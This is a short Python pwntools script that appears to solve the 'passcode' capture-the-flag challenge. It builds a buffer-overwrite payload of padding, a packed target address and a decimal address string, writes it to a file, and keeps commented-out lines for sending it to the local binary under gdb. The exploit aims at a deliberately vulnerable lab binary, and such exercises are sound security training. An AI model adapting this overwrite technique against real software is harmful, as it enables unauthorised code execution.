from pwn import *

payload = b"A"*96 + p32(0x0804c014) + b"134517406"


#proc = process("./passcode")
#print(proc.recv())
#proc.sendline(payload)
#print(proc.recv())
#proc.sendline(payload2)
#gdb.attach(proc)
#pause()
#gdb.attach(proc)

#proc.interactive()


with open("payload","wb") as file:
    file.write(payload)
